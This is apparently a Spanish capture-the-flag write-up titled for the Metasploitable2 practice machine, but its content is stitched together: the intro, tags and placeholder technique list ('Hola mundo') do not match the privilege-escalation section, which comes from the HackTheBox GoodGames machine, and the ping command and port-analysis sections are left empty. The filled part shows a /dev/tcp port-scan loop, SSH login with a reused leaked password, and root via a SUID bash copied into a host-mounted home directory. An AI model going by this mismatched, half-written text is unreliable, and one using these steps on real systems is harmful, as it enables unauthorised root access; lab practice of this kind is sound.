---
title: MTD - Metasploitable2
published: true
categories: [Linux]
tags: [eJPT, eWPT, eCPPTv2, OSCP, Fácil]
---

<img src="/assets/HTB/GoodGames/goodgames.png">

¡Hola!
Vamos a resolver de la máquina `Metasploitable2` de dificultad "Fácil".
Metasploitable es una máquina virtual Linux intencionadamente vulnerable. Esta máquina virtual puede utilizarse para impartir formación en seguridad, probar herramientas de seguridad y practicar técnicas habituales de pruebas de penetración. 

Técnicas Vistas: 

- **SQLI (Error Based)**
- **Hola mundo**
- **Holamundo**
- 

### Preparación Entorno

* * *

Antes de iniciar la fase de enumeración y reconocimiento procederemos a crear un directorio de trabajo con el nombre `Meow`. Una vez creado accedemos al directorio y con la ayuda de la función que tenemos definida en la zshrc `mkt` crearemos cuatro directorios de trabajo `nmap, content, exploits y scripts` donde almacenaremos de una manera ordenada toda la información que vayamos recopilando de la máquina en función de su naturaleza.

```bash
function mkt(){
    mkdir {nmap,content,exploits,scripts}
}
```

### Reconocimiento

* * *

Accedemos al directorio de trabajo `nmap` e iniciamos nuestra fase de reconocimiento realizando un `ping` a la IP de la máquina para comprobar que esté activa y detectamos su sistema operativo basándonos en el `ttl` de una traza **ICMP**.

```bash
❯ ping -c 1 
PING 10.129.247.12 (10.129.247.12) 56(84) bytes of data.
64 bytes from 10.129.247.12: icmp_seq=1 ttl=63 time=42.3 ms

--- 10.129.247.12 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 42.314/42.314/42.314/0.000 ms
```
Identificamos que es una maquina **Linux** debido a su ttl (time to live) correspondiente a 63 (Disminuye en 1 debido a que realiza un salto adicional en el entorno de HackTHeBox).

* TTL => 64 Linux
* TTL => 128 Windows

Continuamos con la enumeración de los **65535** puertos en la máquina.

```bash
nmap -p- --open --min-rate 5000 -vvv -n -Pn 10.129.247.12 -oG allPorts


```

### Análisis de puertos y vulnerabilidades.

* * *



Examinamos 



### Escalada De Privilegios 

* * *

Enumerando los adaptadores de red observamos que la Ip del contenedor es `172.19.0.2`. Habitualmente Docker asigna la primera dirección de la subred al host. Procedemos a escanear la IP `172.19.0.1` para ver posibles puertos abiertos para un posible movimiento lateral. También localizamos el nombre de un usuario en la carpeta `home` llamado `augustus`

```bash
root@3a453ab39d3d:/backend# for PORT in {0..1000}; do timeout 1 bash -c "</dev/tcp/172.19.0.1/$PORT  &>/dev/null" 2>/dev/null && echo "port $PORT is open"; done
port 22 is open
port 80 is open
```

Localizamos puertos 22 y 80 abiertos. Probamos a conectarnos por ssh con el usuario `augustus` y la contraseña anteriormente revelada `superadministrator`

```bash
root@3a453ab39d3d:/backend# ssh augustus@172.19.0.1
The authenticity of host '172.19.0.1 (172.19.0.1)' can't be established.
ECDSA key fingerprint is SHA256:AvB4qtTxSVcB0PuHwoPV42/LAJ9TlyPVbd7G6Igzmj0.
Are you sure you want to continue connecting (yes/no)? yes
Warning: Permanently added '172.19.0.1' (ECDSA) to the list of known hosts.
augustus@172.19.0.1's password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
augustus@GoodGames:~$ whoami
augustus
```
Localizamos la flag de usuario en su directorio personal `/home/augustus`

```bash
augustus@GoodGames:~$ cat /home/augustus/user.txt 
782c233c281f642d7***************
```
Observando detenidamente el /etc/passwd del contenedor vemos que no hay ningún usuario augustus por lo que deducimos que el deirectorio `/home/augustus` es una montura del directorio home del host. Se nos ocurre copiar el binario de bash dentro de la carpeta home de augustus, volver al contenedor donde somos root, asignamos propietario y grupo root a la bash, asignamos privilegios SUID y nos volvemos a conectar al host con augustus por ssh y ya tenemos una bash con privilegio SUID donde podemos acceder a root con el comando `bash -p`

```bash
augustus@GoodGames:~$ pwd
/home/augustus
augustus@GoodGames:~$ cp /bin/bash .
augustus@GoodGames:~$ exit
logout
Connection to 172.19.0.1 closed.
root@3a453ab39d3d:/backend# cd /home/augustus/
root@3a453ab39d3d:/home/augustus# chown root:root bash
root@3a453ab39d3d:/home/augustus# chmod u+s bash
root@3a453ab39d3d:/home/augustus# ssh augustus@172.19.0.1
augustus@172.19.0.1 s password: 
Linux GoodGames 4.19.0-18-amd64 #1 SMP Debian 4.19.208-1 (2021-09-29) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Fri Nov 25 10:10:24 2022 from 172.19.0.2
augustus@GoodGames:~$ ls
bash  user.txt
augustus@GoodGames:~$ ls -la
total 1232
drwxr-xr-x 2 augustus augustus    4096 Nov 25 10:35 .
drwxr-xr-x 3 root     root        4096 Oct 19  2021 ..
-rwsr-xr-x 1 root     root     1234376 Nov 25 10:35 bash
lrwxrwxrwx 1 root     root           9 Nov  3  2021 .bash_history -> /dev/null
-rw-r--r-- 1 augustus augustus     220 Oct 19  2021 .bash_logout
-rw-r--r-- 1 augustus augustus    3526 Oct 19  2021 .bashrc
-rw-r--r-- 1 augustus augustus     807 Oct 19  2021 .profile
-rw-r----- 1 augustus augustus      33 Nov 25 08:31 user.txt
augustus@GoodGames:~$ ./bash -p
bash-5.1# whoami
root
bash-5.1# cat /root/root.txt 
0e1e68c764891001a***************
```

Hemos completado la máquina **GoodGames** de HackTheBox!! Happy Hacking!!

<img src="/assets/HTB/GoodGames/pwned.png">
